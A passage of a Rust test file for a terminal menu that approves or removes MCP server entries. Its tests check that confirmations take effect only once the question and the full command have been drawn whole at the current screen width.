    menu.take(vec![ready("fixture"), connecting("remote"), moved], 0);
    drawn(&menu, 120);
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Server);
}

#[test]
fn up_and_down_on_a_question_leave_its_answer() {
    let mut menu = three();
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let answer = |menu: &McpMenu| {
        let row = &menu.rows(120, 10, PALETTE)[6];
        row.contains("\u{1b}[1;38;5;255mno")
    };
    // Read after every key: a pair that each flipped it would cancel out.
    assert!(!answer(&menu));
    for key in [Key::Up, Key::Down] {
        menu.press(key);
        assert!(!answer(&menu), "{key:?} chose no");
    }
    menu.press(Key::Right);
    assert!(answer(&menu));
    for key in [Key::Down, Key::Up] {
        menu.press(key);
        assert!(answer(&menu), "{key:?} chose yes");
    }
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Server);
}

#[test]
fn an_approval_below_twenty_columns_approves_nothing() {
    // An entry short enough that every row of it fits nineteen columns: only
    // the width rule refuses it there (its question is cut), and at twenty
    // the same entry is approved.
    let short = || Row {
        target: "/bin/sh".into(),
        entry: entry(&["command: /bin/sh"], "digest-s"),
        ..pending("proj")
    };
    let approval = |cols: u16| {
        let mut menu = McpMenu::open(vec![short()], 0, Instant::now());
        menu.press(Key::Enter);
        menu.press(Key::Enter);
        assert_eq!(menu.screen(), Screen::Confirm(Choice::Approve));
        let count = menu.height(cols, MAX_ROWS, 30);
        let rows = menu.rows(cols, count, PALETTE);
        assert!(
            rows.iter()
                .any(|row| plain(row).trim_end() == "    /bin/sh"),
            "{rows:?}"
        );
        menu.press(Key::Enter)
    };
    assert!(matches!(
        approval(19),
        Effect::Refused(why) if why.contains("couldn't show all")
    ));
    assert!(matches!(approval(20), Effect::Run(Run::Approve { .. })));
}

#[test]
fn opening_an_approval_again_forgets_the_one_drawn_before() {
    // The approval drawn, Esc, opened again: its Enter waits for a frame of
    // the screen now up, not the one drawn before it.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    drawn(&menu, 120);
    menu.press(Key::Escape);
    menu.press(Key::Enter);
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Approve));
}

#[test]
fn an_approval_drawn_for_one_server_approves_no_other() {
    // Two waiting servers with the same digest: what was drawn for one is no
    // approval of the other, should the open server change under it.
    let mut menu = McpMenu::open(vec![pending("one"), pending("two")], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    drawn(&menu, 120);
    menu.selected = "two".into();
    assert_eq!(menu.press(Key::Enter), Effect::None);
}

#[test]
fn a_line_wider_on_the_screen_than_it_was_measured_is_not_drawn_whole() {
    // opus-B SHOULD 3: the wrap measures a character at a time and the row a
    // cluster at a time; a line the row has to cut with `…` is not all on
    // the screen, so Enter approves nothing. (No spelled row is known to
    // hold such a cluster; the rows here are put in as they are.)
    let mut wide = pending("wide");
    wide.entry = Some(Arc::new(ShownEntry {
        rows: vec![format!("command: {}", "\u{2764}\u{fe0f}".repeat(40))],
        digest: "d".into(),
    }));
    let mut menu = McpMenu::open(vec![wide], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let rows = drawn(&menu, 60);
    assert!(rows.iter().any(|row| row.ends_with('\u{2026}')), "{rows:?}");
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Refused(why) if why.contains("couldn't show all")
    ));
}

#[test]
fn a_panel_of_the_title_alone_draws_no_question_and_takes_no_answer() {
    // opus-X: at one row the screen's window was `count - 1` = 0, `lines -=
    // 1` underflowed (a wrap in a release build), every line was composed,
    // the question marked drawn, and `rows` cut it all away but the title.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    assert_eq!(menu.rows(120, 1, PALETTE).len(), 1);
    assert_eq!(menu.press(Key::Enter), Effect::None, "answered unseen");
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    drawn(&menu, 120);
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Run(Run::Remove { .. })
    ));
}

#[test]
fn remove_keeps_the_file_it_acts_on_whole_and_shortens_a_long_name() {
    // opus-X: cut from its end, a long name pushed `from FILE?` off the row
    // while the question still counted as drawn.
    let long = "n".repeat(80);
    let ask = |cols: u16| {
        let mut menu = McpMenu::open(vec![ready(&long)], 0, Instant::now());
        menu.press(Key::Enter);
        menu.press(Key::Enter);
        assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
        let rows = drawn(&menu, cols);
        let asked = rows
            .iter()
            .find(|row| row.contains("Remove "))
            .unwrap_or_else(|| panic!("{rows:?}"))
            .clone();
        (menu, asked)
    };
    let (mut menu, asked) = ask(80);
    assert!(
        asked.contains(" from ~/.xfx/mcp.json?   yes  no"),
        "{asked:?}"
    );
    assert!(asked.contains("n\u{2026} from"), "{asked:?}");
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Run(Run::Remove { .. })
    ));
    // Too narrow for the file and a cell of the name: said, and asked again
    // once a frame draws it whole.
    let (mut menu, asked) = ask(40);
    assert!(!asked.contains("mcp.json?"), "{asked:?}");
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Refused(why) if why.contains("couldn't show which file")
    ));
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    drawn(&menu, 120);
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Run(Run::Remove { .. })
    ));
}

#[test]
fn a_question_asked_again_waits_for_a_frame_of_its_own() {
    // opus-X pin: asking resets what the last question drew -- Esc does not,
    // so an answer to the second ask would ride on the first one's frame.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    drawn(&menu, 120);
    menu.press(Key::Escape);
    assert_eq!(menu.screen(), Screen::Server);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    assert_eq!(menu.press(Key::Enter), Effect::None);
}

#[test]
fn a_wrapped_piece_wider_on_the_screen_than_it_was_measured_is_not_drawn_whole() {
    // opus-X pin, the `Continued` arm of `fits`: the first piece fits, and
    // the rest of the row -- `❤️` one cell a character, two a cluster --
    // would be cut on the screen.
    let wide = format!("{} {}", "x".repeat(30), "\u{2764}\u{fe0f}".repeat(30));
    let row = Row {
        entry: entry(&[&format!("command: {wide}")], "digest-w"),
        ..pending("proj")
    };
    let mut menu = McpMenu::open(vec![row], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let rows = drawn(&menu, 40);
    assert_eq!(
        rows[3].trim_end(),
        format!("    {}", "x".repeat(30)),
        "{rows:?}"
    );
    assert!(rows[4].starts_with("  \u{21b3} \u{2764}"), "{rows:?}");
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Refused(why) if why.contains("couldn't show all")
    ));
}

#[test]
fn a_name_cut_to_its_ellipsis_alone_is_not_a_question_drawn_whole() {
    // opus-Md: with one cell left beside ` from FILE?` a long name is a bare
    // `…`, which names no server. A name of one character fits that cell.
    let ask = |name: &str, cols: u16| {
        let mut menu = McpMenu::open(vec![ready(name)], 0, Instant::now());
        menu.press(Key::Enter);
        menu.press(Key::Enter);
        assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
        let rows = drawn(&menu, cols);
        let asked = rows
            .iter()
            .find(|row| row.contains("Remove "))
            .unwrap_or_else(|| panic!("{rows:?}"))
            .clone();
        (menu.press(Key::Enter), asked)
    };
    // 42 columns: 30 for the question, 29 of them `Remove ` and the file.
    let long = "n".repeat(80);
    let (answer, asked) = ask(&long, 42);
    assert!(!asked.contains("Remove \u{2026} from"), "{asked:?}");
    assert!(
        matches!(answer, Effect::Refused(ref why) if why.contains("couldn't show which file")),
        "{answer:?}"
    );
    let (answer, asked) = ask(&long, 43);
    assert!(
        asked.contains("Remove n\u{2026} from ~/.xfx/mcp.json?"),
        "{asked:?}"
    );
    assert!(
        matches!(answer, Effect::Run(Run::Remove { .. })),
        "{answer:?}"
    );
    let (answer, asked) = ask("q", 42);
    assert!(
        asked.contains("Remove q from ~/.xfx/mcp.json?"),
        "{asked:?}"
    );
    assert!(
        matches!(answer, Effect::Run(Run::Remove { .. })),
        "{answer:?}"
    );
    // MCP-Mf: a first cluster two cells wide does not fit the one cell
    // beside the `…` -- at 43 columns the name was a bare `…` again. A
    // profile name written by hand can be one; a project name cannot.
    let wide = "\u{540d}\u{524d}\u{30b5}\u{30fc}\u{30d0}\u{30fc}";
    let (answer, asked) = ask(wide, 43);
    assert!(!asked.contains("Remove \u{2026} from"), "{asked:?}");
    assert!(
        matches!(answer, Effect::Refused(ref why) if why.contains("couldn't show which file")),
        "{answer:?}"
    );
    let (answer, asked) = ask(wide, 44);
    assert!(
        asked.contains("Remove \u{540d}\u{2026} from ~/.xfx/mcp.json?"),
        "{asked:?}"
    );
    assert!(
        matches!(answer, Effect::Run(Run::Remove { .. })),
        "{answer:?}"
    );
    // An empty name fits whole only where the question does: at 40 columns
    // `Remove  from ~/.xfx/mcp.json?` is a cell past the 28 there.
    let (answer, asked) = ask("", 40);
    assert!(
        matches!(answer, Effect::Refused(ref why) if why.contains("couldn't show which file")),
        "{answer:?} {asked:?}"
    );
    let (answer, asked) = ask("", 41);
    assert!(asked.contains("Remove  from ~/.xfx/mcp.json?"), "{asked:?}");
    assert!(
        matches!(answer, Effect::Run(Run::Remove { .. })),
        "{answer:?}"
    );
}
